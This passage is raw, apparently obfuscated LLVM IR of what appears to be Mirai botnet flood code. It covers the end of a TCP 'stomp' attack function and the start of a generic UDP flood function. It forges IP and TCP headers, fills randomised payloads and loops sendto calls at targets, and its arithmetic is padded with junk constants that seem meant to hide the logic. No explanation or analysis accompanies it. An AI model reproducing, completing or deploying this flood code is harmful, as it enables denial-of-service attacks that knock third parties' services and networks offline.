  %288 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i32 0, i32 3
  store i16 %287, i16* %292, align 4
  %293 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %294 = load i16, i16* %293, align 2
  %295 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %296 = load i32, i32* %9, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i64 %297
  %299 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %298, i32 0, i32 4
  store i16 %294, i16* %299, align 2
  %300 = load i32, i32* %24, align 4
  %301 = sext i32 %300 to i64
  %302 = sub i64 40, -489818987453855285
  %303 = add i64 %302, %301
  %304 = add i64 %303, -489818987453855285
  %305 = add i64 40, %301
  %306 = call noalias i8* @malloc(i64 %304) #6
  %307 = load i8**, i8*** %12, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds i8*, i8** %307, i64 %309
  store i8* %306, i8** %310, align 8
  %311 = load i8**, i8*** %12, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds i8*, i8** %311, i64 %313
  %315 = load i8*, i8** %314, align 8
  %316 = bitcast i8* %315 to %struct.iphdr*
  store %struct.iphdr* %316, %struct.iphdr** %36, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i64 1
  %319 = bitcast %struct.iphdr* %318 to %struct.tcphdr*
  store %struct.tcphdr* %319, %struct.tcphdr** %37, align 8
  %320 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i64 1
  %322 = bitcast %struct.tcphdr* %321 to i8*
  store i8* %322, i8** %38, align 8
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = bitcast %struct.iphdr* %323 to i8*
  %325 = load i8, i8* %324, align 4
  %326 = xor i8 %325, -1
  %327 = xor i8 15, -1
  %328 = xor i8 -87, -1
  %329 = or i8 %326, %327
  %330 = or i8 -87, %328
  %331 = xor i8 %329, -1
  %332 = and i8 %331, %330
  %333 = and i8 %325, 15
  %334 = xor i8 %332, -1
  %335 = xor i8 64, -1
  %336 = xor i8 -99, -1
  %337 = and i8 %334, -99
  %338 = and i8 %332, %336
  %339 = and i8 %335, -99
  %340 = and i8 64, %336
  %341 = or i8 %337, %338
  %342 = or i8 %339, %340
  %343 = xor i8 %341, %342
  %344 = or i8 %334, %335
  %345 = xor i8 %344, -1
  %346 = or i8 -99, %336
  %347 = and i8 %345, %346
  %348 = or i8 %343, %347
  %349 = or i8 %332, 64
  store i8 %348, i8* %324, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = bitcast %struct.iphdr* %350 to i8*
  %352 = load i8, i8* %351, align 4
  %353 = xor i8 %352, -1
  %354 = xor i8 -16, -1
  %355 = xor i8 25, -1
  %356 = or i8 %353, %354
  %357 = or i8 25, %355
  %358 = xor i8 %356, -1
  %359 = and i8 %358, %357
  %360 = and i8 %352, -16
  %361 = and i8 %359, 5
  %362 = xor i8 %359, 5
  %363 = or i8 %361, %362
  %364 = or i8 %359, 5
  store i8 %363, i8* %351, align 4
  %365 = load i8, i8* %13, align 1
  %366 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 1
  store i8 %365, i8* %367, align 1
  %368 = load i32, i32* %24, align 4
  %369 = sext i32 %368 to i64
  %370 = sub i64 40, -8390264983732696093
  %371 = add i64 %370, %369
  %372 = add i64 %371, -8390264983732696093
  %373 = add i64 40, %369
  %374 = trunc i64 %372 to i16
  %375 = call zeroext i16 @htons(i16 zeroext %374) #7
  %376 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 2
  store i16 %375, i16* %377, align 2
  %378 = load i16, i16* %14, align 2
  %379 = call zeroext i16 @htons(i16 zeroext %378) #7
  %380 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 3
  store i16 %379, i16* %381, align 4
  %382 = load i8, i8* %15, align 1
  %383 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 5
  store i8 %382, i8* %384, align 4
  %385 = load i8, i8* %16, align 1
  %386 = icmp ne i8 %385, 0
  br i1 %386, label %387, label %391

; <label>:387:                                    ; preds = %258
  %388 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %389 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 4
  store i16 %388, i16* %390, align 2
  br label %391

; <label>:391:                                    ; preds = %387, %258
  %392 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 6
  store i8 6, i8* %393, align 1
  %394 = load i32, i32* @LOCAL_ADDR, align 4
  %395 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 8
  store i32 %394, i32* %396, align 4
  %397 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %398 = load i32, i32* %9, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 4
  %403 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 9
  store i32 %402, i32* %404, align 4
  %405 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %406 = load i32, i32* %9, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %408, i32 0, i32 3
  %410 = load i16, i16* %409, align 4
  %411 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  store i16 %410, i16* %412, align 4
  %413 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %414 = load i32, i32* %9, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %416, i32 0, i32 4
  %418 = load i16, i16* %417, align 2
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 1
  store i16 %418, i16* %420, align 2
  %421 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %422 = load i32, i32* %9, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %424, i32 0, i32 2
  %426 = load i32, i32* %425, align 4
  %427 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 2
  store i32 %426, i32* %428, align 4
  %429 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i32 0, i32 1
  %434 = load i32, i32* %433, align 4
  %435 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 3
  store i32 %434, i32* %436, align 4
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = xor i16 %439, -1
  %441 = xor i16 -241, -1
  %442 = xor i16 -2647, -1
  %443 = or i16 %440, %441
  %444 = or i16 -2647, %442
  %445 = xor i16 %443, -1
  %446 = and i16 %445, %444
  %447 = and i16 %439, -241
  %448 = and i16 %446, 128
  %449 = xor i16 %446, 128
  %450 = or i16 %448, %449
  %451 = or i16 %446, 128
  store i16 %450, i16* %438, align 4
  %452 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 4
  %454 = load i16, i16* %453, align 4
  %455 = xor i16 %454, -1
  %456 = xor i16 -257, -1
  %457 = xor i16 -27618, -1
  %458 = or i16 %455, %456
  %459 = or i16 -27618, %457
  %460 = xor i16 %458, -1
  %461 = and i16 %460, %459
  %462 = and i16 %454, -257
  %463 = and i16 %461, 256
  %464 = xor i16 %461, 256
  %465 = or i16 %463, %464
  %466 = or i16 %461, 256
  store i16 %465, i16* %453, align 4
  %467 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 4
  %469 = load i16, i16* %468, align 4
  %470 = xor i16 %469, -1
  %471 = xor i16 -4097, -1
  %472 = xor i16 32274, -1
  %473 = or i16 %470, %471
  %474 = or i16 32274, %472
  %475 = xor i16 %473, -1
  %476 = and i16 %475, %474
  %477 = and i16 %469, -4097
  %478 = and i16 %476, 4096
  %479 = xor i16 %476, 4096
  %480 = or i16 %478, %479
  %481 = or i16 %476, 4096
  store i16 %480, i16* %468, align 4
  %482 = call i32 @rand_next()
  %483 = xor i32 65535, -1
  %484 = xor i32 %482, %483
  %485 = and i32 %484, %482
  %486 = and i32 %482, 65535
  %487 = trunc i32 %485 to i16
  %488 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 5
  store i16 %487, i16* %489, align 2
  %490 = load i8, i8* %18, align 1
  %491 = sext i8 %490 to i16
  %492 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %493 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %492, i32 0, i32 4
  %494 = load i16, i16* %493, align 4
  %495 = xor i16 1, -1
  %496 = xor i16 %491, %495
  %497 = and i16 %496, %491
  %498 = and i16 %491, 1
  %499 = shl i16 %497, 13
  %500 = xor i16 %494, -1
  %501 = xor i16 -8193, -1
  %502 = xor i16 -4022, -1
  %503 = or i16 %500, %501
  %504 = or i16 -4022, %502
  %505 = xor i16 %503, -1
  %506 = and i16 %505, %504
  %507 = and i16 %494, -8193
  %508 = and i16 %506, %499
  %509 = xor i16 %506, %499
  %510 = or i16 %508, %509
  %511 = or i16 %506, %499
  store i16 %510, i16* %493, align 4
  %512 = load i8, i8* %19, align 1
  %513 = sext i8 %512 to i16
  %514 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 4
  %516 = load i16, i16* %515, align 4
  %517 = xor i16 1, -1
  %518 = xor i16 %513, %517
  %519 = and i16 %518, %513
  %520 = and i16 %513, 1
  %521 = shl i16 %519, 12
  %522 = xor i16 %516, -1
  %523 = xor i16 -4097, -1
  %524 = xor i16 -2941, -1
  %525 = or i16 %522, %523
  %526 = or i16 -2941, %524
  %527 = xor i16 %525, -1
  %528 = and i16 %527, %526
  %529 = and i16 %516, -4097
  %530 = xor i16 %528, -1
  %531 = xor i16 %521, -1
  %532 = xor i16 24248, -1
  %533 = and i16 %530, 24248
  %534 = and i16 %528, %532
  %535 = and i16 %531, 24248
  %536 = and i16 %521, %532
  %537 = or i16 %533, %534
  %538 = or i16 %535, %536
  %539 = xor i16 %537, %538
  %540 = or i16 %530, %531
  %541 = xor i16 %540, -1
  %542 = or i16 24248, %532
  %543 = and i16 %541, %542
  %544 = or i16 %539, %543
  %545 = or i16 %528, %521
  store i16 %544, i16* %515, align 4
  %546 = load i8, i8* %20, align 1
  %547 = sext i8 %546 to i16
  %548 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %549 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %548, i32 0, i32 4
  %550 = load i16, i16* %549, align 4
  %551 = xor i16 1, -1
  %552 = xor i16 %547, %551
  %553 = and i16 %552, %547
  %554 = and i16 %547, 1
  %555 = shl i16 %553, 11
  %556 = xor i16 -2049, -1
  %557 = xor i16 %550, %556
  %558 = and i16 %557, %550
  %559 = and i16 %550, -2049
  %560 = xor i16 %558, -1
  %561 = xor i16 %555, -1
  %562 = xor i16 23384, -1
  %563 = and i16 %560, 23384
  %564 = and i16 %558, %562
  %565 = and i16 %561, 23384
  %566 = and i16 %555, %562
  %567 = or i16 %563, %564
  %568 = or i16 %565, %566
  %569 = xor i16 %567, %568
  %570 = or i16 %560, %561
  %571 = xor i16 %570, -1
  %572 = or i16 23384, %562
  %573 = and i16 %571, %572
  %574 = or i16 %569, %573
  %575 = or i16 %558, %555
  store i16 %574, i16* %549, align 4
  %576 = load i8, i8* %21, align 1
  %577 = sext i8 %576 to i16
  %578 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 4
  %580 = load i16, i16* %579, align 4
  %581 = xor i16 1, -1
  %582 = xor i16 %577, %581
  %583 = and i16 %582, %577
  %584 = and i16 %577, 1
  %585 = shl i16 %583, 10
  %586 = xor i16 %580, -1
  %587 = xor i16 -1025, -1
  %588 = xor i16 -17487, -1
  %589 = or i16 %586, %587
  %590 = or i16 -17487, %588
  %591 = xor i16 %589, -1
  %592 = and i16 %591, %590
  %593 = and i16 %580, -1025
  %594 = xor i16 %592, -1
  %595 = xor i16 %585, -1
  %596 = xor i16 26777, -1
  %597 = and i16 %594, 26777
  %598 = and i16 %592, %596
  %599 = and i16 %595, 26777
  %600 = and i16 %585, %596
  %601 = or i16 %597, %598
  %602 = or i16 %599, %600
  %603 = xor i16 %601, %602
  %604 = or i16 %594, %595
  %605 = xor i16 %604, -1
  %606 = or i16 26777, %596
  %607 = and i16 %605, %606
  %608 = or i16 %603, %607
  %609 = or i16 %592, %585
  store i16 %608, i16* %579, align 4
  %610 = load i8, i8* %22, align 1
  %611 = sext i8 %610 to i16
  %612 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 4
  %614 = load i16, i16* %613, align 4
  %615 = xor i16 1, -1
  %616 = xor i16 %611, %615
  %617 = and i16 %616, %611
  %618 = and i16 %611, 1
  %619 = shl i16 %617, 9
  %620 = xor i16 -513, -1
  %621 = xor i16 %614, %620
  %622 = and i16 %621, %614
  %623 = and i16 %614, -513
  %624 = and i16 %622, %619
  %625 = xor i16 %622, %619
  %626 = or i16 %624, %625
  %627 = or i16 %622, %619
  store i16 %626, i16* %613, align 4
  %628 = load i8, i8* %23, align 1
  %629 = sext i8 %628 to i16
  %630 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %631 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %630, i32 0, i32 4
  %632 = load i16, i16* %631, align 4
  %633 = xor i16 %629, -1
  %634 = xor i16 1, -1
  %635 = xor i16 -7545, -1
  %636 = or i16 %633, %634
  %637 = or i16 -7545, %635
  %638 = xor i16 %636, -1
  %639 = and i16 %638, %637
  %640 = and i16 %629, 1
  %641 = shl i16 %639, 8
  %642 = xor i16 %632, -1
  %643 = xor i16 -257, -1
  %644 = xor i16 20934, -1
  %645 = or i16 %642, %643
  %646 = or i16 20934, %644
  %647 = xor i16 %645, -1
  %648 = and i16 %647, %646
  %649 = and i16 %632, -257
  %650 = xor i16 %648, -1
  %651 = xor i16 %641, -1
  %652 = xor i16 -1609, -1
  %653 = and i16 %650, -1609
  %654 = and i16 %648, %652
  %655 = and i16 %651, -1609
  %656 = and i16 %641, %652
  %657 = or i16 %653, %654
  %658 = or i16 %655, %656
  %659 = xor i16 %657, %658
  %660 = or i16 %650, %651
  %661 = xor i16 %660, -1
  %662 = or i16 -1609, %652
  %663 = and i16 %661, %662
  %664 = or i16 %659, %663
  %665 = or i16 %648, %641
  store i16 %664, i16* %631, align 4
  %666 = load i8*, i8** %38, align 8
  %667 = load i32, i32* %24, align 4
  call void @rand_str(i8* %666, i32 %667)
  br label %716

; <label>:668:                                    ; preds = %247, %236
  %669 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %670 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %669, i32 0, i32 4
  %671 = load i16, i16* %670, align 4
  %672 = lshr i16 %671, 8
  %673 = xor i16 %672, -1
  %674 = xor i16 1, -1
  %675 = xor i16 -22465, -1
  %676 = or i16 %673, %674
  %677 = or i16 -22465, %675
  %678 = xor i16 %676, -1
  %679 = and i16 %678, %677
  %680 = and i16 %672, 1
  %681 = zext i16 %679 to i32
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %698, label %683

; <label>:683:                                    ; preds = %668
  %684 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %685 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %684, i32 0, i32 4
  %686 = load i16, i16* %685, align 4
  %687 = lshr i16 %686, 10
  %688 = xor i16 %687, -1
  %689 = xor i16 1, -1
  %690 = xor i16 10525, -1
  %691 = or i16 %688, %689
  %692 = or i16 10525, %690
  %693 = xor i16 %691, -1
  %694 = and i16 %693, %692
  %695 = and i16 %687, 1
  %696 = zext i16 %694 to i32
  %697 = icmp ne i32 %696, 0
  br i1 %697, label %698, label %701

; <label>:698:                                    ; preds = %683, %668
  %699 = load i32, i32* %26, align 4
  %700 = call i32 @close(i32 %699)
  br label %121

; <label>:701:                                    ; preds = %683
  br label %702

; <label>:702:                                    ; preds = %701
  br label %703

; <label>:703:                                    ; preds = %702, %224
  br label %704

; <label>:704:                                    ; preds = %703, %220, %212
  %705 = call i64 @time(i64* null) #6
  %706 = load i64, i64* %31, align 8
  %707 = add i64 %705, 3241175706451132735
  %708 = sub i64 %707, %706
  %709 = sub i64 %708, 3241175706451132735
  %710 = sub nsw i64 %705, %706
  %711 = icmp sgt i64 %709, 10
  br i1 %711, label %712, label %715

; <label>:712:                                    ; preds = %704
  %713 = load i32, i32* %26, align 4
  %714 = call i32 @close(i32 %713)
  br label %121

; <label>:715:                                    ; preds = %704
  br label %200

; <label>:716:                                    ; preds = %391
  br label %717

; <label>:717:                                    ; preds = %716, %124
  %718 = load i32, i32* %9, align 4
  %719 = add i32 %718, 270008440
  %720 = add i32 %719, 1
  %721 = sub i32 %720, 270008440
  %722 = add nsw i32 %718, 1
  store i32 %721, i32* %9, align 4
  br label %115

; <label>:723:                                    ; preds = %115
  br label %724

; <label>:724:                                    ; preds = %853, %723
  store i32 0, i32* %9, align 4
  br label %725

; <label>:725:                                    ; preds = %846, %724
  %726 = load i32, i32* %9, align 4
  %727 = load i8, i8* %5, align 1
  %728 = zext i8 %727 to i32
  %729 = icmp slt i32 %726, %728
  br i1 %729, label %730, label %853

; <label>:730:                                    ; preds = %725
  %731 = load i8**, i8*** %12, align 8
  %732 = load i32, i32* %9, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8*, i8** %731, i64 %733
  %735 = load i8*, i8** %734, align 8
  store i8* %735, i8** %39, align 8
  %736 = load i8*, i8** %39, align 8
  %737 = bitcast i8* %736 to %struct.iphdr*
  store %struct.iphdr* %737, %struct.iphdr** %40, align 8
  %738 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %739 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %738, i64 1
  %740 = bitcast %struct.iphdr* %739 to %struct.tcphdr*
  store %struct.tcphdr* %740, %struct.tcphdr** %41, align 8
  %741 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %742 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %741, i64 1
  %743 = bitcast %struct.tcphdr* %742 to i8*
  store i8* %743, i8** %42, align 8
  %744 = load i16, i16* %14, align 2
  %745 = zext i16 %744 to i32
  %746 = icmp eq i32 %745, 65535
  br i1 %746, label %747, label %756

; <label>:747:                                    ; preds = %730
  %748 = call i32 @rand_next()
  %749 = xor i32 65535, -1
  %750 = xor i32 %748, %749
  %751 = and i32 %750, %748
  %752 = and i32 %748, 65535
  %753 = trunc i32 %751 to i16
  %754 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %755 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %754, i32 0, i32 3
  store i16 %753, i16* %755, align 4
  br label %756

; <label>:756:                                    ; preds = %747, %730
  %757 = load i8, i8* %25, align 1
  %758 = icmp ne i8 %757, 0
  br i1 %758, label %759, label %762

; <label>:759:                                    ; preds = %756
  %760 = load i8*, i8** %42, align 8
  %761 = load i32, i32* %24, align 4
  call void @rand_str(i8* %760, i32 %761)
  br label %762

; <label>:762:                                    ; preds = %759, %756
  %763 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 7
  store i16 0, i16* %764, align 2
  %765 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %766 = bitcast %struct.iphdr* %765 to i16*
  %767 = call zeroext i16 @checksum_generic(i16* %766, i32 20)
  %768 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %769 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %768, i32 0, i32 7
  store i16 %767, i16* %769, align 2
  %770 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %771 = load i32, i32* %9, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %770, i64 %772
  %774 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %773, i32 0, i32 1
  %775 = load i32, i32* %774, align 4
  %776 = sub i32 0, %775
  %777 = sub i32 0, 1
  %778 = add i32 %776, %777
  %779 = sub i32 0, %778
  %780 = add i32 %775, 1
  store i32 %779, i32* %774, align 4
  %781 = trunc i32 %775 to i16
  %782 = call zeroext i16 @htons(i16 zeroext %781) #7
  %783 = zext i16 %782 to i32
  %784 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %785 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %784, i32 0, i32 2
  store i32 %783, i32* %785, align 4
  %786 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %787 = load i32, i32* %9, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %786, i64 %788
  %790 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %789, i32 0, i32 2
  %791 = load i32, i32* %790, align 4
  %792 = trunc i32 %791 to i16
  %793 = call zeroext i16 @htons(i16 zeroext %792) #7
  %794 = zext i16 %793 to i32
  %795 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %796 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %795, i32 0, i32 3
  store i32 %794, i32* %796, align 4
  %797 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %798 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %797, i32 0, i32 6
  store i16 0, i16* %798, align 4
  %799 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %800 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %801 = bitcast %struct.tcphdr* %800 to i8*
  %802 = load i32, i32* %24, align 4
  %803 = sext i32 %802 to i64
  %804 = add i64 20, 8671558645091948804
  %805 = add i64 %804, %803
  %806 = sub i64 %805, 8671558645091948804
  %807 = add i64 20, %803
  %808 = trunc i64 %806 to i16
  %809 = call zeroext i16 @htons(i16 zeroext %808) #7
  %810 = load i32, i32* %24, align 4
  %811 = sext i32 %810 to i64
  %812 = sub i64 20, -6470839274082986592
  %813 = add i64 %812, %811
  %814 = add i64 %813, -6470839274082986592
  %815 = add i64 20, %811
  %816 = trunc i64 %814 to i32
  %817 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %799, i8* %801, i16 zeroext %809, i32 %816)
  %818 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %819 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %818, i32 0, i32 6
  store i16 %817, i16* %819, align 4
  %820 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %821 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %820, i32 0, i32 1
  %822 = load i16, i16* %821, align 2
  %823 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %824 = load i32, i32* %9, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %823, i64 %825
  %827 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %826, i32 0, i32 0
  %828 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %827, i32 0, i32 1
  store i16 %822, i16* %828, align 2
  %829 = load i32, i32* %10, align 4
  %830 = load i8*, i8** %39, align 8
  %831 = load i32, i32* %24, align 4
  %832 = sext i32 %831 to i64
  %833 = sub i64 0, %832
  %834 = sub i64 40, %833
  %835 = add i64 40, %832
  %836 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %837 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %838 = load i32, i32* %9, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %837, i64 %839
  %841 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %840, i32 0, i32 0
  %842 = bitcast %struct.sockaddr_in* %841 to %struct.sockaddr*
  store %struct.sockaddr* %842, %struct.sockaddr** %836, align 8
  %843 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %844 = load %struct.sockaddr*, %struct.sockaddr** %843, align 8
  %845 = call i64 @sendto(i32 %829, i8* %830, i64 %834, i32 16384, %struct.sockaddr* %844, i32 16)
  br label %846

; <label>:846:                                    ; preds = %762
  %847 = load i32, i32* %9, align 4
  %848 = sub i32 0, %847
  %849 = sub i32 0, 1
  %850 = add i32 %848, %849
  %851 = sub i32 0, %850
  %852 = add nsw i32 %847, 1
  store i32 %851, i32* %9, align 4
  br label %725

; <label>:853:                                    ; preds = %725
  br label %724

; <label>:854:                                    ; preds = %211, %111, %105
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
